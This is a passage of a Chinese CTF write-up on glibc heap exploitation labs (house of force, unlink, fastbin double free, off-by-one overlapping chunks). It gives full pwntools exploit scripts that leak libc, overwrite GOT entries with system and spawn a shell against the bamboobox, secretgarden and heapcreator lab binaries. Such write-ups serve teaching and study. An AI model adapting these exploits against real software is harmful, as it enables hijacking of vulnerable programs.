    <span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">add</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0x60</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;aaaa&#39;</span><span class="p">)</span> <span class="c1"># -(sizeof(item)) - sizeof(box) - 0x10</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./bamboobox&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>快速确定需要 malloc 的大数/负数可以使用 Pwngdb 的 force 功能, 这里我做了一个 <a href="https://github.com/0x01f/Pwngdb">fork</a>, 把 Pwngdb 和 pwndbg 的功能做了一个合并</p>
</blockquote>
<h4 id="unlink">unlink</h4>
<p>至于 unlink，在这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf">slide</a> 中有较大篇幅的介绍，就不在说明原理了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab11</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">unlink</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./bamboobox&#34;</span><span class="p">)</span>
<span class="c1"># process(&#34;./bamboobox&#34;).libc will assign libc.address but ELF(&#34;./bamboobox&#34;) won&#39;t</span>
<span class="c1">#  libc = io.libc</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./bamboobox&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>

<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">():</span>
	<span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="mh">0x6020c8</span>

    <span class="n">fakeChunk</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">])</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">fakeChunk</span><span class="p">)</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]])</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">show</span><span class="p">()</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc.address -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="c1">#  libcBase = u64(io.recvuntil(&#34;\x7f&#34;)[-6: ].ljust(8, &#39;\x00&#39;)) - libc.sym[&#39;atoi&#39;]</span>
    <span class="c1">#  success(&#34;libcBase -&gt; {:#x}&#34;.format(libcBase))</span>
    <span class="n">pause</span><span class="p">()</span>

    <span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
    <span class="c1">#  change(0, 0x8, p64(libcBase + libc.sym[&#39;system&#39;]))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;$0&#39;</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>可以看出，通过 house of house 直接控制函数指针进而控制 ip 的方法代码量少了不少，这也提醒我们不要放弃利用任何一个函数指针的机会</p>
<h3 id="lab12-secretgarden">lab12-secretgarden</h3>
<p>通过 double free 实现 fastbin attack 的题目，所谓 double free，指的就是对同一个 allocated chunk free 两次，这样就可以形成一个类似 <strong>0  -&gt; 1 -&gt; 0</strong> 的 cycled fastbin list，这样当我们 malloc 出 0 时，就可以修改 fastbin list 中 0 的 fd，如 <strong>1 -&gt; 0 -&gt; target</strong>，这样只要我们再 malloc 三次，并通过 malloc 的检查，就可以实现 malloc 到任何地址，进而实现任意地址写，至于 double free 的检查怎么绕过可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">():</span>
    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x4009F2&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">Raise</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="s2">&#34;nb&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="c1">#  io = process(&#34;./secretgarden&#34;, {&#34;LD_PRELOAD&#34;: &#34;./libc-2.23.so&#34;})</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./secretgarden&#34;</span><span class="p">)</span>

    <span class="n">Raise</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s2">&#34;000&#34;</span><span class="p">)</span> <span class="c1"># 0</span>
    <span class="n">Raise</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s2">&#34;111&#34;</span><span class="p">)</span> <span class="c1"># 1</span>

    <span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0</span>
    <span class="c1">#  pause()</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 1 -&gt; 0</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0 -&gt; 1 -&gt; 0</span>

    <span class="n">magic</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./secretgarden&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;magic&#34;</span><span class="p">]</span>
    <span class="c1">#  fakeChunk = 0x602028 + 2 - 8</span>
    <span class="n">fakeChunk</span> <span class="o">=</span> <span class="mh">0x602000</span><span class="o">+</span><span class="mi">2</span><span class="o">-</span><span class="mi">8</span>

    <span class="n">Raise</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakeChunk</span><span class="p">))</span> <span class="c1"># 0</span>
    <span class="n">Raise</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s2">&#34;111&#34;</span><span class="p">)</span> <span class="c1"># 1</span>
    <span class="n">Raise</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s2">&#34;000&#34;</span><span class="p">)</span>
    <span class="c1">#  DEBUG()</span>
    <span class="c1">#  payload = cyclic(8 - 2) + p64(magic) * 8</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="n">Raise</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><ul>
<li>以上的 exp 实现了通过 fastbin attack 来修改 got, 实际上通过 fastbin attack 来修改 __malloc_hook, __realloc_hook, __free_hook, IO_file_plus 结构体中的 jump_table 也是很常见的做法, 尤其是程序开了 Full Relro 保护时</li>
<li>pwnable.tw 的 Secret Garden 一题就用到了以上几种做法, 可以参考这篇 <a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/">writeup</a></li>
<li>参考了 <a href="https://veritas501.space/2018/03/27/%E8%B0%83%E6%95%99pwndbg/">veritas501</a> 师傅的文章, 我在我的 <a href="https://github.com/0x01f/Pwngdb">fork</a> 里也加入了快速利用 fastbin attack 的函数 fake_fastbin_all</li>
</ul>
<h3 id="lab13-heapcreator">lab13-heapcreator</h3>
<p>在 edit_heap 中有一个故意留下来的 off-by-one，并且不是 off-by-one null byte，因此我们就可以有很大自由度地控制下一个 chunk 的 size, 可以使用 extended chunk 这种技巧造成 overlapping chunk，进而通过将 *content 覆写为某函数的 got (如 free/atoi) 就可以 leak 出 libc 的地址，然后再改写为 system 的地址，控制参数即可 get shell</p>
<p>关于 extended chunk 的介绍可以看这个 <strong><a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab13</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>

<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./heapcreator&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;LD_LOADPRE&#34;</span><span class="p">:</span> <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">})</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s1">&#39;0000&#39;</span><span class="p">)</span> <span class="c1"># 0</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;1111&#39;</span><span class="p">)</span> <span class="c1"># 1</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># overwrite 1</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># overlapping chunk</span>

    <span class="n">freeGot</span> <span class="o">=</span> <span class="mh">0x0000000000602018</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">freeGot</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">libcBase</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;free&#34;</span><span class="p">]</span>
    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;libcBase -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libcBase</span><span class="p">))</span>
    <span class="c1">#  pause()</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libcBase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]))</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
